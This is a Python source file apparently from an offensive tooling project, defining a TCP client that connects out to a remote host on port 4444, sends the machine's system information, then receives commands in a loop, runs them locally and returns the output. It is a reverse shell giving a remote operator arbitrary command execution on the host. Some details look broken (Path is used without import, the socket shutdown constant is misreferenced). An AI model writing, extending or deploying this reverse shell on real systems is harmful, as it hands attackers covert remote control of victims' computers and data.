#from multi import utils
from multi import utils
from .nodeutils import (
    os,
    SocketStream,
    shutil,
    sys,
    subprocess,
    socket
)


class Client(SocketStream):
    """TCP socket client class for the command shell"""
    def __init__(self, rhost: str, port: int = 4444, buff: int = 1024, verb=False):
        super().__init__(rhost, port, buff, verb)
        self.Shell = None

    def spawn_shell(self, op_sys: str = os.name) -> subprocess.Popen:
        """Spawn new command shell process to be used for code execution"""
        environment = os.environ.copy()

        if op_sys == "nt":
            shell_exec = shutil.which("powershell.exe")
            if shell_exec is None:
                shell_exec = shutil.which("cmd.exe")
        else:
            shell_exec = shutil.which("bash")
            if shell_exec is None:
                shell_exec = shutil.which("sh")

        # Popen expects [str] for non-shell calls
        shell = subprocess.Popen(
            [], shell=True,
            executable=shell_exec,
            env=environment,
            cwd=str(Path.home()),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding="utf-8"
        )

        if self.Verbose:
            utils.status(f"{shell_exec}")

        self.Shell = shell
        return self.Shell

    def connect(self) -> None:
        """Initiate connection to remote server shell"""
        sock = socket.socket()
        sock.setblocking(True)
        sock.settimeout(60)

        executable = self.get_executable(os.name)

        try:
            sock.connect((self.Address, self.Port))
        except socket.timeout:
            utils.throw(f"Connection with {self.Address}, timed out.")
        except:
            utils.throw(f"Could not establish connection with {self.Address}")

        try:
            establish_msg = sock.recv(self.Buffer).decode()
            utils.status(establish_msg)

            sysinfo = self.sys_info()
            sock.sendall(sysinfo.encode())
            #shell = self.spawn_shell(os.name)

            while True:
                command = sock.recv(self.Buffer).decode()

                if self.Verbose:
                    utils.status(command)

                if command.lower() in ["exit", "quit"]:
                    sock.sendall("Connection will now terminate".encode())
                    break

                #stdout, stderr = shell.communicate(command.split(), timeout=60)
                raw_output = self.execute(command, executable)

                if self.Verbose:
                    utils.status(raw_output.decode())

                sock.sendall(raw_output)
        except Exception as exc:
            self.except_handler(exc)
        finally:
            if self.Shell is not None:
                if self.Verbose:
                    utils.status(f"Killing shell process {self.Shell.pid}")

                self.Shell.kill()

            sock.shutdown(socket.socket.SHUT_WR)
            sock.close()
